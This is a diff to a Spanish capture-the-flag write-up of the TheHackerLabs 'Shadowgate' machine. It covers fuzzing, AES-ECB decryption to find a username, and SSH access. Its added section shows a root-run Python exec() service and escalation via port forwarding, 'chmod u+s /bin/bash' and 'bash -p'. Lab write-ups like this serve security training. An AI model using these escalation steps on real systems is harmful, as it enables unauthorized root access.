@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Shadowgate - TheHackerLabs
-excerpt: "."
-date: 2026-03-12
+excerpt: "Esta fue una máquina bastante complicada. Después de analizar los escaneos, nos conectamos al servicio expuesto en el puerto 56789, en el que descubrimos que, al pasarle una frase que te muestra al conectarse, se nos devuelven varias cadenas codificadas en base64. A su vez, nos dirigimos a la página web activa en el puerto 8080 para aplicarle Fuzzing, encontrando una ruta que nos lleva a un login que solo acepta peticiones POST, pero que nos pide un usuario que, de momento, no tenemos. Investigando las cadenas que obtuvimos anteriormente, descubrimos que son bloques encriptados en AES-ECB, que logramos desencriptar e identificamos que algunos caracteres no cambian, siendo estos el usuario que necesita el login. Una vez que das este dato, el login te indica que debes buscar una nueva ruta para colocar un token. Volvemos a aplicar Fuzzing y descubrimos la ruta faltante, que al darle el token nos indica un cambio en un servicio, siendo este cambio reflejado en el servicio del puerto 56789, que al volver a conectarnos, nos da las credenciales de acceso al servicio SSH. Dentro de la máquina víctima, descubrimos un servicio interno que resulta ser un intérprete de Python que puede ejecutar comandos/scripts como Root. Exponemos este servicio aplicando Local Port Forwarding y logramos darle permisos SUID a la Bash para poder escalar privilegios y convertirnos en Root."
+date: 2026-03-15
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-shadowgate/shadowgate.png
@@ -14,24 +14,38 @@ categories:
 tags:
   - Linux
   - SSH
-  - 
+  - Web Enumeration
+  - Fuzzing
+  - Analizing and Abusing of Customized Service
+  - BurpSuite
+  - Decrypting AES-ECB Blocks
+  - Local Port Forwarding
+  - Abusing Python's Custom Built-In Interpreter
+  - Privesc - Abusing Python's Custom Built-In Interpreter
   - OSCP Style
 ---
 ![](/assets/images/THL-writeup-shadowgate/shadowgate.png)
 
-texto
+Esta fue una máquina bastante complicada. Después de analizar los escaneos, nos conectamos al servicio expuesto en el **puerto 56789**, en el que descubrimos que, al pasarle una frase que te muestra al conectarse, se nos devuelven varias cadenas codificadas en **base64**. A su vez, nos dirigimos a la página web activa en el **puerto 8080** para aplicarle **Fuzzing**, encontrando una ruta que nos lleva a un login que solo acepta peticiones **POST**, pero que nos pide un usuario que, de momento, no tenemos. Investigando las cadenas que obtuvimos anteriormente, descubrimos que son bloques encriptados en **AES-ECB,** que logramos desencriptar e identificamos que algunos caracteres no cambian, siendo estos el usuario que necesita el login. Una vez que das este dato, el login te indica que debes buscar una nueva ruta para colocar un token. Volvemos a aplicar **Fuzzing** y descubrimos la ruta faltante, que al darle el token nos indica un cambio en un servicio, siendo este cambio reflejado en el servicio del **puerto 56789**, que al volver a conectarnos, nos da las credenciales de acceso al **servicio SSH**. Dentro de la máquina víctima, descubrimos un servicio interno que resulta ser un intérprete de **Python** que puede ejecutar comandos/scripts como **Root**. Exponemos este servicio aplicando Local Port Forwarding y logramos darle **permisos SUID** a la **Bash** para poder escalar privilegios y convertirnos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
 * *nc*
+* *base64*
+* *echo*
 * *ffuf*
 * *gobuster*
+* *sha256sum*
+* *openssl*
+* *CyberChef*
+* *python3*
 * *BurpSuite*
-* **
-* **
-* **
-* **
+* *nxc*
+* *ssh*
+* *ss*
+* *grep*
+* *bash*
 
 
 <br>
@@ -56,11 +70,11 @@ Herramientas utilizadas:
 				<ul>
 					<li><a href="#CyberChefPython">Desencriptando Bloques AES-ECB con CyberChef y Script de Python</a></li>
 				</ul>
-				<li><a href="#fuzz2SSH">Identificando Ruta para Código OTP y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
+				<li><a href="#fuzz2SSH">Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#Privesc">Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -405,11 +419,11 @@ Ahora debemos buscar un usuario válido, pero todo parece indicar que quien ocul
 
 <h2 id="AES-ECB">Desencriptando Bloques Cifrados con AES-ECB</h2>
 
-Investigando que podríamos hacer con las respuestas del **puerto 56789**, y con ayuda de **ChatGPT**, encontramos lo siguiente:
-* Cada cadena decodificada (a excepción de la primera), tiene un tamaño de 16 bytes.
+Investigando qué podríamos hacer con las respuestas del **puerto 56789**, y con ayuda de **ChatGPT**, encontramos lo siguiente:
+* Cada cadena decodificada (a excepción de la primera) tiene un tamaño de 16 bytes.
 * La primer cadena parece más alguna clave, un **salt**, un hash o un seed.
-* La cantidad de bytes de cada cadena, puede que pertenezca al **cifrado AES**.
-* Si las cadenas estan cifradas en **AES**, debemos encontrar el modo de operación para descifrarlas.
+* La cantidad de bytes de cada cadena puede que pertenezca al **cifrado AES**.
+* Si las cadenas están cifradas en **AES**, debemos encontrar el modo de operación para descifrarlas.
 
 Aquí dejo algunas definiciones importantes:
 
@@ -425,16 +439,16 @@ Aquí dejo algunas definiciones importantes:
 
 <br>
 
-No hay una forma clara de que podamos identificar que **modo de operación** se utilizo, por lo que tendremos que probar algunas formas de desencriptar cada bloque en **base64**.
+No hay una forma clara de qué podamos identificar que **modo de operación** se utilizó, por lo que tendremos que probar algunas formas de desencriptar cada bloque en **base64**.
 
-Enfoquemonos en el **modo de operación ECB (Electronic Codebook)**.
+Enfoquémonos en el **modo de operación ECB (Electronic Codebook)**.
 
-El siguiente blog se menciona como desencriptar un bloque que fue encriptado con **AES - ECB**:
+En el siguiente blog se menciona cómo desencriptar un bloque que fue encriptado con **AES - ECB**:
 * <a href="https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/" target="_blank">Reddit: How do you decode AES ECB?</a>
 
 Para poder hacer esto, necesitaremos lo siguiente:
-* La llave que se uso para encriptar el bloque, convertida en un **Hash SHA256**.
-* El bloque sin que este codificado en **base64**.
+* La llave que se usó para encriptar el bloque, convertida en un **Hash SHA256**.
+* El bloque sin que esté codificado en **base64**.
 * El **padding**, pero esto depende de la cantidad de bytes del bloque encriptado y los que tenemos son de 16 bytes, lo que indica que no tiene **padding**.
 
 Vemos que tenemos todo, a excepción de la llave, pero como tenemos de pista que puede ser el primer bloque que encontramos, tan solo vamos a convertirla en un **Hash SHA256**:
@@ -447,9 +461,9 @@ Y usaremos el siguiente comando para desencriptar el bloque:
 ```bash
 openssl enc -aes-256-ecb -d -K HashCopiadoSHA256 -nopad -in cadena1.bin
 ```
-El archivo **cadena.bin**, almacena cualquier cadena decodificada en **base64**.
+El archivo **cadena.bin** almacena cualquier cadena decodificada en **base64**.
 
-Probémos:
+Probemos:
 ```bash
 openssl enc -aes-256-ecb -d -K 7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75 -nopad -in cadena1.bin
 vI-.LGFe+WonYhS~
@@ -478,7 +492,7 @@ Quedaría de la siguiente forma:
 
 Excelente, tenemos cada cadena desencriptada.
 
-Ahora bien, también podemos realizarlo con el siguiente script de **Python**:
+Ahora bien, aprovechando la ayuda de **ChatGPT**, podemos usar el siguiente script de **Python** para automatizar la desencriptación:
 ```python
 from Crypto.Cipher import AES
 import hashlib
@@ -499,16 +513,16 @@ with open("output.txt") as f:
         plaintext = cipher.decrypt(ciphertext)
         print(plaintext)
 ```
-Solo necesitaras guardar todos los bloques que estan en **base64**, a excepción del primero que es la llave, dentro de un archivo de texto con el nombre **output.txt**, pero ese 
+Solo necesitarás guardar todos los bloques que están en **base64**, a excepción del primero, que es la llave, dentro de un archivo de texto con el nombre **output.txt**, pero ese 
 nombre se puede cambiar a tu gusto.
 
-Aparte, necesitaras tener instalada la siguiente librería:
+Aparte, necesitarás tener instalada la siguiente librería:
 ```bash
 pip3 install pycryptodome
 ```
 Te recomiendo hacerlo en un ambiente virtual de **Python**.
 
-Ya solo ejecutalo y observa el resultado:
+Ya solo ejecútalo y observa el resultado:
 ```bash
 python3 decryptAES.py
 b'vI-.LGFe+WonYhS~'
@@ -520,23 +534,23 @@ b'g/i-eS}m}Bpd@9jq'
 b"x)V~LizZz6uR?M'u"
 b'9q7ddl1l>T!EX9Ln'
 ```
-En ambos casos, podemos ver que los resultados son muy distintos, pero con la diferencia importante de que el primer caracter nunca cambia.
+En ambos casos, podemos ver que los resultados son muy distintos, pero con la diferencia importante de que el primer carácter nunca cambia.
 
-Si copiamos y pegamos cada caracter inicial dentro de la petición del login, pero como un usuario, obtendremos la siguiente respuesta:
+Si copiamos y pegamos cada carácter inicial dentro de la petición del login, pero como un usuario, obtendremos la siguiente respuesta:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-shadowgate/Captura5.png">
 </p>
 
-Encontramos el usuario correcto, pero nos dice que debemos encontrar una ruta donde colocar un **código OTP** y se nos da uno como una cabecera,
+Encontramos el usuario correcto, pero nos dice que debemos encontrar una ruta donde colocar un token, que parece más un **código OTP** y se nos da uno como una cabecera,
 
-Tendremos que aplicar **Fuzzing** denuevo.
+Tendremos que aplicar **Fuzzing** de nuevo.
 
 <br>
 
-<h2 id="fuzz2SSH">Identificando Ruta para Código OTP y Ganando Acceso a la Máquina Víctima Vía SSH</h2>
+<h2 id="fuzz2SSH">Identificando Ruta para Colocar Token y Ganando Acceso a la Máquina Víctima Vía SSH</h2>
 
-Búsquemos esa ruta con la herramienta **ffuf**:
+Busquemos esa ruta con la herramienta **ffuf**:
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -X POST -u http://192.168.100.220:8080/FUZZ -mc 200 -H 'Content-Type: application/x-www-form-urlencoded'
 
@@ -584,17 +598,17 @@ Apuntemos a ella desde la petición que capturamos con **BurpSuite** y usemos el
 <img src="/assets/images/THL-writeup-shadowgate/Captura6.png">
 </p>
 
-Si funcionó.
+Sí funcionó.
 
-Dale el código correcto:
+Dale el token correcto:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-shadowgate/Captura7.png">
 </p>
 
-Nos dicen que se activo un servicio, pero al escanear la máquina no vemos nada.
+Nos dicen que se activó un servicio, pero al escanear la máquina no vemos nada.
 
-Pero al entrar denuevo al **puerto 56789**, obtendremos una respuesta distinta:
+Pero al entrar de nuevo al **puerto 56789**, obtendremos una respuesta distinta:
 ```bash
 nc 192.168.100.220 56789
 Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
@@ -605,13 +619,13 @@ Connection closing...
 ```
 Nos dio credenciales para entrar al **servicio SSH**.
 
-Comprobémos si funcionan:
+Comprobemos si funcionan:
 ```bash
 nxc ssh 192.168.100.220 -u 'mars' -p '**********'
 SSH         192.168.100.220   22     192.168.100.220    [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
 SSH         192.168.100.220   22     192.168.100.220    [+] mars:**********  Linux - Shell access!
 ```
-Si funcionan.
+Sí funcionan.
 
 Entremos:
 ```bash
@@ -641,64 +655,119 @@ mars@TheHackersLabs-Shadowgate:~$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="Privesc">Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios</h2>
 
+Actualmente, nuestro usuario no tiene ningún privilegio, pero al realizar la enumeración, podremos encontrar los siguientes scripts en la ruta `/opt/shadowgate/bin`:
 ```bash
-
+mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la
+total 20
+drwxr-xr-x 2 root root 4096 may  3  2025 .
+drwxr-xr-x 4 root root 4096 may  2  2025 ..
+-rw-r--r-- 1 root root 2462 may  3  2025 gate.py
+-rwxr-xr-x 1 root root 1060 may  3  2025 shadow-client.py
+-rw-r--r-- 1 root root 3304 may  3  2025 web-login.py
 ```
+Revisándolos, veremos que son los servicios desplegados que atacamos y todos son ejecutados por el **Root**.
 
+Pero el único que no hemos visto activo es el servicio que despliega el script **shadow-client.py**:
 ```bash
+mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py 
+#!/usr/bin/env python3
+import socket
+import threading
+import io
+import contextlib
 
+def handle_client(client_socket):
+    client_socket.send(b"Welcome to Shadow Client Helper\n")
+    client_socket.send(b"This is an unrestricted environment. Good luck, hacker.\n")
+    while True:
+        client_socket.send(b">>> ")
+        code = client_socket.recv(1024).decode().strip()
+        try:
+            output = io.StringIO()
+            with contextlib.redirect_stdout(output):
+                exec(code, globals())
+            result = output.getvalue()
+            if result.strip():
+                client_socket.send(result.encode())
+        except Exception as e:
+            client_socket.send(f"Error: {e}\n".encode())
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("127.0.0.1", 4444))
+    server.listen(5)
+    while True:
+        client, addr = server.accept()
+        client_handler = threading.Thread(target=handle_client, args=(client,))
+        client_handler.start()
+
+if __name__ == "__main__":
+    main()
 ```
+A primera vista parece ser solo una conexión a un servicio interno (**localhost**) por el **puerto 4444**, pero analizando el código podemos ver que se trata de un intérprete de **Python**,
+pues no solo vemos que simula el prompt de **Python**, sino que vemos la función `exec(code, globals())`, lo que indica que puede ejecutar cualquier comando que le mandemos, pero solo 
+en **Python**.
 
+En resumen, este script crea un intérprete de **Python** de uso interno que permite ejecutar comandos/scripts.
+
+Comprobemos con el comando **ss** y **grep**:
 ```bash
-
+mars@TheHackersLabs-Shadowgate:~$ ss -tulnp | grep 4444
+tcp   LISTEN 0      5                              127.0.0.1:4444       0.0.0.0:*
 ```
+Ahí está, sí está activo ese servicio.
 
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
+Para que podamos conectarnos, vamos a aplicar **Local Port Forwarding** aprovechando que tenemos acceso a la máquina vía SSH, y mantendremos la sesión activa para realizar cualquier 
+movimiento necesario: 
+```bash 
 ssh -L 4444:0.0.0.0:4444 mars@192.168.100.220
-mars@192.168.100.220's password: 
+mars@192.168.100.220's password:
+...
 Last login: Mon Mar 16 04:51:52 2026
-mars@TheHackersLabs-Shadowgate:~$
+mars@TheHackersLabs-Shadowgate:~$ 
 ```
+Funcionó y puedes comprobarlo con **ss** en tu máquina.
 
+Ya podemos conectarnos a ese servicio apuntando al localhost y al puerto que hayamos elegido:
 ```bash
 nc 127.0.0.1 4444
 Welcome to Shadow Client Helper
 This is an unrestricted environment. Good luck, hacker.
 >>>
 ```
+Estamos dentro.
 
+Ahora, ya vimos que este servicio lo corre el **Root**, por lo que podemos darle **permisos SUID** a la **Bash** para escalar privilegios.
 
+Primero, veamos qué permisos tiene la **Bash**:
 ```bash
 mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
 ```
 
+Ahora, desde el servicio activo, vamos a cargar la librería **os** de **Python** y luego le damos **permisos SUID** a la **Bash**:
 ```bash
 >>> import os 
 >>> os.system('chmod u+s /bin/bash')
 ```
 
+Comprobemos si funcionó:
 ```bash
 mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
 ```
 
+Excelente, ya solo ejecutamos la **Bash** con privilegios:
 ```bash
 mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ bash -p
 bash-5.2# whoami
 root
 ```
+Somos **Root**.
 
+Busquemos la última flag:
 ```bash
 bash-5.2# cd /root
 bash-5.2# ls
@@ -706,8 +775,7 @@ root.txt
 bash-5.2# cat root.txt
 ...
 ```
-
-
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -719,7 +787,6 @@ bash-5.2# cat root.txt
 
 * https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/
 * https://gchq.github.io/CyberChef/
-* https://github.com/peass-ng/PEASS-ng
 
 
 <br>
